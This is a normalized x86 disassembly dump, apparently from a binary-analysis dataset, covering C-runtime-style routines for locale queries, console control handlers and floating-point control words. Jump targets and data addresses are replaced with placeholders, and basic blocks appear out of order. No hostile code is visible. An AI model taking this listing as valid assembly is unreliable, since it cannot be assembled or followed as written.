jne r-xdata
push esi
call sub_43b91e
add esp 0xc
test eax eax
je r-xdata
push edi
push eax
sub_43b7c6
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
xor esi esi
movzx ecx [ edx ]
test cx cx
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push edi
push 0x5
pop edi
lea eax [ ecx - 0x41 ]
cmp ax di
ja r-xdata
add ecx 0xffd9
jmp r-xdata
movzx ecx cx
add ecx 0xffffffd0
shl esi 0x4
add esi ecx
movzx ecx [ edx ]
test cx cx
jne r-xdata
add ecx 0xfff9
lea eax [ ecx - 0x61 ]
lea edx [ edx + 0x2 ]
cmp ax di
ja r-xdata
pop edi
sub_43b817
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push 0x20001004
push [ eax + 0x8 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
xor eax eax
cmp [ ecx ] ax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov esi r--data
mov edx ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
call [ GetACP@IAT ]
sbb edx edx
or edx 0x1
test di di
je r-xdata
mov esi r--data
mov edx ecx
mov edx eax
jmp r-xdata
mov di [ edx + 0x2 ]
cmp di [ esi + 0x2 ]
jne r-xdata
sbb eax eax
or eax 0x1
test di di
je r-xdata
test edx edx
je r-xdata
add edx 0x4
add esi 0x4
test di di
jne r-xdata
push ecx
call sub_42ef12
pop ecx
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push 0x2000000b
push [ eax + 0x8 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
mov di [ edx + 0x2 ]
cmp di [ esi + 0x2 ]
jne r-xdata
mov di [ edx ]
cmp di [ esi ]
jne r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
add edx 0x4
add esi 0x4
test di di
jne r-xdata
mov di [ edx ]
cmp di [ esi ]
jne r-xdata
jmp r-xdata
sub_43b8fa
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_43b91e
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
call sub_430a7e
mov esi [ ebp + 0x8 ]
mov edi eax
push 0x2
lea eax [ ebp - 0x4 ]
mov ecx esi
push eax
and ecx 0x3ff
push 0x20000001
or ecx 0x400
push ecx
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ edi + 0x50 ]
lea ecx [ esi + 0x2 ]
mov ax [ esi ]
add esi 0x2
test ax ax
jne r-xdata
push [ edi + 0x50 ]
sub esi ecx
sar esi 0x1
call sub_43b472
pop ecx
cmp eax esi
je r-xdata
sub_43b98e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
test esi esi
js r-xdata
xor al al
lea eax [ ebx + esi ]
cdq
sub eax edx
mov edi eax
mov eax [ ebp + 0x8 ]
sar edi 0x1
imul ecx edi 0xc
push [ ecx + eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_444b19
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
imul eax edi 0xc
add ecx 0x4
add eax ecx
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov al 0x1
jmp r-xdata
jns r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
lea ebx [ edi + 0x1 ]
lea esi [ edi - 0x1 ]
jmp r-xdata
cmp ebx esi
jle r-xdata
sub_43b9eb
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x18 ] eax
call sub_430a7e
add eax 0x50
lea edi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
call sub_430a7e
lea ecx [ ebp - 0x10 ]
xor edx edx
mov [ eax + 0x34c ] ecx
lea ecx [ esi + 0x80 ]
mov eax [ ebp - 0x14 ]
mov [ eax ] esi
lea edi [ eax + 0x4 ]
mov [ edi ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] edx
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ ecx ] dx
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp [ eax ] dx
je r-xdata
mov eax [ r--data ]
push edi
dec eax
push eax
push r--data
call sub_43b98e
mov eax [ ebp - 0x14 ]
add esp 0xc
xor edx edx
mov [ ebp - 0x10 ] 0x104
call [ GetUserDefaultLCID@IAT ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
cmp [ eax ] dx
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ esi + 0x100 ]
neg esi
sbb esi esi
and esi eax
push esi
call sub_43b817
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
xor eax eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43b30d
pop ecx
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_43b411
cmp [ eax ] dx
je r-xdata
cmp esi 0xfde8
je r-xdata
xor edi edi
xor edi edi
mov eax [ r--data ]
push [ ebp - 0x14 ]
dec eax
push eax
push r--data
call sub_43b98e
add esp 0xc
test al al
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_43b376
jmp r-xdata
cmp esi 0xfde9
je r-xdata
mov eax [ edi ]
xor edi edi
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop ecx
jne r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_43b411
cmp [ eax ] di
je r-xdata
push 0x1
push [ ebp - 0xc ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_43b376
jmp r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
pop ecx
jmp r-xdata
mov eax [ ebp - 0x14 ]
push edi
push 0x55
add eax 0x250
push eax
push [ ebp - 0xc ]
call sub_42fe4d
test ebx ebx
je r-xdata
mov [ eax ] esi
xor eax eax
inc eax
jmp r-xdata
push edi
push 0x55
lea eax [ ebx + 0x120 ]
push eax
push [ ebp - 0xc ]
call sub_42fe4d
push 0x40
push ebx
push 0x1001
push [ ebp - 0xc ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
push 0x40
lea eax [ ebx + 0x80 ]
push eax
push 0x1002
push [ ebp - 0x8 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push 0xa
push 0x10
lea ecx [ ebx + 0x100 ]
push ecx
push esi
call sub_444910
add esp 0x10
sub_43bbf2
mov edi edi
push ebp
mov ebp esp
push ecx
call sub_430a7e
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_434ba8
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov eax [ eax + 0x88 ]
mov esp ebp
pop ebp
retn
sub_43bc27
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push edi
test ebx ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0x10 ]
jae r-xdata
xor edi edi
push ebx
call sub_444cc1
pop ecx
mov edi eax
jmp r-xdata
call sub_430f56
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
cmp edi esi
jae r-xdata
imul esi [ ebp + 0x10 ]
push esi
push ebx
call sub_444cf4
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
pop esi
pop ebp
retn
sub esi edi
lea eax [ ebx + edi ]
push esi
push 0x0
push eax
call sub_40dea0
add esp 0xc
sub_43bcbb
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi [ ebp + 0x8 ]
cmp edi [ ebp + 0xc ]
jne r-xdata
push esi
mov esi edi
push ebx
mov al 0x1
jmp r-xdata
add esi 0x8
cmp esi [ ebp + 0xc ]
jne r-xdata
mov ecx ebx
call [ r--data ]
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ebx [ esi ]
test ebx ebx
je r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
cmp esi edi
je r-xdata
mov al 0x1
jmp r-xdata
xor al al
add esi 0xfffffffc
pop ebx
pop esi
sub esi 0x8
lea eax [ esi + 0x4 ]
cmp eax edi
jne r-xdata
mov ebx [ esi ]
test ebx ebx
je r-xdata
cmp [ esi - 0x4 ] 0x0
je r-xdata
push 0x0
mov ecx ebx
call [ r--data ]
call ebx
pop ecx
sub_43bd3e
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0xc ]
cmp [ ebp + 0x8 ] esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
add esi 0xfffffffc
push edi
sub esi 0x8
lea eax [ esi + 0x4 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
mov ecx edi
call [ r--data ]
call edi
pop ecx
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
sub_43bda3
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx esi
and ecx 0x1f
xor esi [ rw-data ]
ror esi cl
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43bdf1
mov eax esi
call sub_40d2b6
retn 0xc
sub_43bdfd
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_43bda3
mov esp ebp
pop ebp
retn
sub_43be3b
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_43bea3
push 0x14
push r--data
call sub_448c20
xor esi esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x24 ] esi
push 0x3
call sub_42f07b
pop ecx
mov [ ebp - 0x4 ] esi
mov edx [ rw-data ]
mov eax edx
mov esi edx
and eax 0x1f
mov ecx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov ebx rw-data
xor esi [ rw-data ]
push 0x15
mov ebx rw-data
xor esi [ rw-data ]
push 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43bf2c
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
ror esi cl
mov [ ebp - 0x20 ] esi
pop edi
mov [ ebp - 0x24 ] edi
test esi esi
je r-xdata
cmp esi 0x1
je r-xdata
xor eax eax
jmp r-xdata
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax edx
mov [ ebx ] eax
xor eax eax
inc eax
push edi
mov ecx esi
call [ r--data ]
call esi
pop ecx
call sub_448c69
retn 0x4
sub_43bf51
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec eax
sub eax 0x1
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x9
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x6
je r-xdata
mov eax rw-data
pop ebp
retn
sub eax 0x1
je r-xdata
xor eax eax
pop ebp
retn
sub_43bf93
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_43bfc4
mov edi edi
push ebp
mov ebp esp
imul ecx [ r--data ] 0xc
mov eax [ ebp + 0xc ]
add ecx eax
cmp eax ecx
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
pop ebp
retn
add eax 0xc
cmp eax ecx
jne r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
sub_43bfec
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x1
je r-xdata
or eax 0xffffffff
pop ebp
retn
cmp eax 0x3
je r-xdata
cmp eax 0xd
je r-xdata
cmp eax 0xf
jle r-xdata
call sub_430f56
mov [ eax ] 0x16
cmp eax 0x11
jle r-xdata
sub_43c020
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x1 ]
push eax
push 0x3
call sub_43bdfd
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_43c037
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_43bf93
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_43bf93
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_43bf93
push [ ebp + 0x8 ]
mov ecx rw-data
call sub_43bf93
pop ebp
retn
sub_43c084
push 0x2c
push r--data
call sub_448c20
xor ebx ebx
mov [ ebp - 0x2c ] ebx
and [ ebp - 0x34 ] ebx
mov cl 0x1
mov [ ebp - 0x1d ] cl
mov esi [ ebp + 0x8 ]
push 0x8
pop edi
cmp esi edi
jg r-xdata
cmp esi 0xb
je r-xdata
je r-xdata
call sub_430b02
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
jne r-xdata
cmp esi 0xf
je r-xdata
lea eax [ esi - 0x1 ]
sub eax 0x1
je r-xdata
push [ ebx ]
push esi
call sub_43bfc4
pop ecx
pop ecx
xor ecx ecx
test eax eax
setne cl
test ecx ecx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push esi
call sub_43bf51
add esp 0x4
jmp r-xdata
cmp esi 0x14
jle r-xdata
dec eax
sub eax 0x1
je r-xdata
add eax 0x8
xor cl cl
mov [ ebp - 0x1d ] cl
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
call sub_448c69
retn
mov [ ebp - 0x28 ] eax
and [ ebp - 0x30 ] 0x0
test cl cl
je r-xdata
cmp esi 0x16
jg r-xdata
dec eax
sub eax 0x1
jne r-xdata
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x1e ] 0x0
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x28 ]
test cl cl
je r-xdata
push 0x3
call sub_42f07b
pop ecx
mov cl [ ebp - 0x1d ]
jmp r-xdata
mov edx [ eax ]
mov edx [ rw-data ]
mov ecx edx
and ecx 0x1f
xor edx [ eax ]
ror edx cl
mov cl [ ebp - 0x1d ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43c244
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
test eax eax
jne r-xdata
mov eax edx
mov [ ebp - 0x24 ] eax
xor edx edx
cmp eax 0x1
sete dl
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x1e ] dl
test dl dl
jne r-xdata
xor eax eax
cmp esi edi
jne r-xdata
cmp esi edi
je r-xdata
test cl cl
je r-xdata
push esi
mov ecx [ ebp - 0x24 ]
call [ r--data ]
call [ ebp - 0x24 ]
call sub_430a7e
push [ eax + 0x8 ]
push edi
mov ecx [ ebp - 0x24 ]
call [ r--data ]
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
and [ ebx + 0x4 ] 0x0
cmp esi edi
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x3
call sub_4171c4
push 0x3
call sub_42f0c3
pop ecx
mov eax [ ebp - 0x30 ]
mov [ ebx + 0x4 ] eax
cmp esi edi
jne r-xdata
cmp esi 0xb
je r-xdata
pop ecx
cmp esi edi
je r-xdata
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov ecx [ ebp - 0x28 ]
mov [ ecx ] eax
call sub_43c072
mov eax [ eax ]
mov [ ebp - 0x34 ] eax
call sub_43c072
mov [ eax ] 0x8c
cmp esi 0x4
jne r-xdata
call sub_430a7e
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8 ] ecx
cmp esi 0x4
jne r-xdata
imul eax [ r--data ] 0xc
add eax [ ebx ]
imul ecx [ r--data ] 0xc
add ecx eax
cmp esi edi
jne r-xdata
and [ eax + 0x8 ] 0x0
add eax 0xc
jmp r-xdata
mov [ ebp - 0x3c ] eax
cmp eax ecx
je r-xdata
sub_43c28c
push 0x18
push r--data
call sub_40d270
mov ebx [ ebp + 0xc ]
cmp ebx 0x4
je r-xdata
push [ ebp + 0x8 ]
cmp ebx 0x3
je r-xdata
mov edi [ ebp + 0x8 ]
cmp edi 0x2
je r-xdata
xor ebx ebx
mov [ ebp - 0x19 ] bl
mov esi ebx
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x20 ] esi
push 0x3
call sub_42f07b
pop ecx
mov [ ebp - 0x4 ] ebx
cmp edi 0x2
je r-xdata
cmp edi 0x15
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp edi 0x15
jne r-xdata
cmp edi 0x16
je r-xdata
push edi
call sub_43bf51
add esp 0x4
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
push 0x1
push sub_43bea3
call [ SetConsoleCtrlHandler@IAT ]
test eax eax
je r-xdata
cmp edi 0x6
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43c426
test bl bl
jne r-xdata
mov esi [ rw-data ]
mov ecx esi
and ecx 0x1f
xor esi [ eax ]
ror esi cl
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0xc ]
cmp eax 0x2
je r-xdata
call sub_430f43
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov bl 0x1
mov [ ebp - 0x19 ] bl
mov esi [ ebp - 0x28 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp edi 0xf
je r-xdata
push edi
jmp r-xdata
mov eax esi
jmp r-xdata
push eax
call sub_43be3b
pop ecx
mov ecx [ ebp - 0x28 ]
mov [ ecx ] eax
cmp edi 0x8
je r-xdata
call sub_43bfec
pop ecx
call sub_40d2b6
retn
call sub_430b02
mov esi eax
test esi esi
je r-xdata
cmp edi 0x4
je r-xdata
cmp [ esi ] r--data
jne r-xdata
cmp edi 0xb
je r-xdata
mov eax [ esi ]
mov [ ebp - 0x24 ] eax
push eax
push edi
call sub_43bfc4
pop ecx
pop ecx
test eax eax
je r-xdata
push [ r--data ]
call sub_42d3eb
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
lea edx [ eax + 0x8 ]
mov ecx [ edx ]
mov [ ebp - 0x28 ] ecx
cmp ebx 0x2
je r-xdata
push [ r--data ]
push r--data
push eax
call sub_40d920
add esp 0xc
mov eax ecx
jmp r-xdata
imul esi [ r--data ] 0xc
add esi [ ebp - 0x24 ]
cmp eax esi
je r-xdata
cmp [ edx - 0x4 ] edi
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov [ edx ] ebx
add edx 0xc
lea ecx [ edx - 0x8 ]
cmp ecx esi
jne r-xdata
sub_43c43e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl cl
jns r-xdata
push ebx
push esi
push edi
mov edi 0x200
test edi ecx
je r-xdata
push 0x10
pop eax
test ecx 0x400
je r-xdata
or eax 0x8
test ecx 0x800
je r-xdata
or eax 0x4
test ecx 0x1000
je r-xdata
or eax 0x2
mov esi 0x100
test esi ecx
je r-xdata
or eax 0x1
mov edx ecx
mov ebx 0x6000
and edx ebx
je r-xdata
or eax 0x80000
pop edi
and ecx 0x8040
pop esi
pop ebx
sub ecx 0x40
je r-xdata
cmp edx 0x2000
je r-xdata
or eax 0x2000000
sub ecx 0x7fc0
je r-xdata
or eax esi
cmp edx 0x4000
je r-xdata
or eax 0x3000000
pop ebp
retn
sub ecx 0x40
jne r-xdata
or eax edi
jmp r-xdata
cmp edx ebx
jne r-xdata
pop ebp
retn
or eax 0x1000000
pop ebp
retn
or eax 0x300
jmp r-xdata
sub_43c4e9
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x3f
je r-xdata
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_43c52c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
stmxcsr [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
and eax 0xffffffc0
mov [ ebp - 0x8 ] eax
ldmxcsr [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
xor eax eax
test cl 0x3f
je r-xdata
mov esp ebp
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_43c584
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov edx 0x1000
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
fwait
fnstcw [ ebp - 0x8 ]
mov ax [ ebp - 0x8 ]
xor edx edx
test al 0x1
je r-xdata
pop edi
xor eax eax
pop esi
inc eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x1
jl r-xdata
test al 0x4
je r-xdata
push 0x10
pop edx
and [ esi ] 0x0
and ebx 0x308031f
stmxcsr [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
xor eax eax
test cl cl
jns r-xdata
test al 0x8
je r-xdata
or edx 0x8
test ecx 0x200
je r-xdata
push 0x10
pop eax
test al 0x10
je r-xdata
or edx 0x4
test ecx 0x400
je r-xdata
or eax 0x8
test al 0x20
je r-xdata
or edx 0x2
test ecx 0x800
je r-xdata
or eax 0x4
test al 0x2
je r-xdata
or edx 0x1
test edx ecx
je r-xdata
or eax 0x2
movzx esi ax
mov ecx esi
and ecx 0xc00
je r-xdata
or edx 0x80000
test ecx 0x100
je r-xdata
or eax 0x1
and esi 0x300
je r-xdata
cmp ecx 0x400
je r-xdata
mov edx ecx
mov edi 0x6000
and edx edi
je r-xdata
or eax 0x80000
or edx 0x20000
cmp esi 0x200
jne r-xdata
or edx 0x100
cmp ecx 0x800
je r-xdata
push 0x40
and ecx 0x8040
pop edi
sub ecx edi
je r-xdata
cmp edx 0x2000
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx ebx
not ecx
and eax ebx
and ecx edx
or ecx eax
cmp ecx edx
je r-xdata
or edx 0x40000
mov ecx 0x1000
test cx ax
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp ecx 0xc00
jne r-xdata
or eax 0x2000000
sub ecx 0x7fc0
je r-xdata
or eax 0x100
cmp edx 0x4000
je r-xdata
mov edx 0x1000
push ecx
call sub_43d037
pop ecx
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ax [ ebp - 0x4 ]
xor ecx ecx
test al 0x1
je r-xdata
or edx 0x300
jmp r-xdata
mov [ esi ] eax
jmp r-xdata
push ecx
call sub_43ca3a
push eax
mov [ ebp - 0xc ] eax
call sub_444df6
pop ecx
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor eax eax
test cl cl
jns r-xdata
or eax 0x3000000
jmp r-xdata
sub ecx edi
jne r-xdata
or eax 0x200
jmp r-xdata
cmp edx edi
jne r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test ecx 0x200
je r-xdata
push 0x10
pop eax
mov ecx ebx
and ebx [ ebp + 0x8 ]
not ecx
and ecx eax
or ecx ebx
cmp ecx eax
je r-xdata
or eax 0x1000000
jmp r-xdata
or eax 0x300
jmp r-xdata
test al 0x8
je r-xdata
or ecx 0x8
test ecx 0x400
je r-xdata
or eax 0x8
test al 0x10
je r-xdata
or ecx 0x4
test ecx 0x800
je r-xdata
or eax 0x4
test al 0x20
je r-xdata
or ecx 0x2
test ecx 0x1000
je r-xdata
or eax 0x2
test al 0x2
je r-xdata
or ecx 0x1
test ecx 0x100
je r-xdata
or eax 0x1
movzx esi ax
mov edx esi
and edx 0xc00
je r-xdata
or ecx 0x80000
mov edx ecx
mov ebx 0x6000
and edx ebx
je r-xdata
or eax 0x80000
and esi 0x300
je r-xdata
cmp edx 0x400
je r-xdata
and ecx 0x8040
sub ecx edi
je r-xdata
cmp edx 0x2000
je r-xdata
or ecx 0x20000
cmp esi 0x200
jne r-xdata
or ecx 0x100
cmp edx 0x800
je r-xdata
or eax 0x2000000
sub ecx 0x7fc0
je r-xdata
or eax 0x100
cmp edx 0x4000
je r-xdata
mov [ edi ] ecx
or ecx 0x40000
jmp r-xdata
mov edx 0x1000
test dx ax
je r-xdata
or ecx 0x10000
jmp r-xdata
or ecx 0x200
jmp r-xdata
cmp edx 0xc00
jne r-xdata
or eax 0x3000000
jmp r-xdata
sub ecx edi
jne r-xdata
or eax 0x200
jmp r-xdata
cmp edx ebx
jne r-xdata
or ecx 0x300
jmp r-xdata
or eax 0x1000000
jmp r-xdata
or eax 0x300
jmp r-xdata
sub_43c8a8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
and edi 0x308031f
stmxcsr [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
xor esi esi
mov eax esi
test cl cl
jns r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop eax
test ecx 0x400
je r-xdata
or eax 0x8
test ecx 0x800
je r-xdata
or eax 0x4
test ecx 0x1000
je r-xdata
or eax 0x2
mov ebx 0x100
test ebx ecx
je r-xdata
or eax 0x1
mov edx ecx
and edx 0x6000
je r-xdata
or eax 0x80000
and ecx 0x8040
sub ecx 0x40
je r-xdata
cmp edx 0x2000
je r-xdata
or eax 0x2000000
sub ecx 0x7fc0
je r-xdata
or eax ebx
cmp edx 0x4000
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edx
call sub_43ca3a
push eax
mov [ ebp - 0x4 ] eax
call sub_444df6
pop ecx
pop ecx
stmxcsr [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
test al al
jns r-xdata
or eax 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or eax 0x200
jmp r-xdata
cmp edx 0x6000
jne r-xdata
mov edx 0x200
test edx eax
je r-xdata
push 0x10
pop esi
mov ecx [ ebp + 0x8 ]
mov edx edi
not edx
and ecx edi
and edx eax
or edx ecx
cmp edx eax
je r-xdata
or eax 0x1000000
jmp r-xdata
or eax 0x300
jmp r-xdata
test eax 0x400
je r-xdata
or esi 0x8
test eax 0x800
je r-xdata
or esi 0x4
test eax 0x1000
je r-xdata
or esi 0x2
test ebx eax
je r-xdata
or esi 0x1
mov ecx eax
mov edi 0x6000
and ecx edi
je r-xdata
or esi 0x80000
and eax 0x8040
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi ebx
cmp ecx 0x4000
je r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi edx
jmp r-xdata
cmp ecx edi
jne r-xdata
mov eax esi
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
sub_43ca3a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
push ebx
push esi
push edi
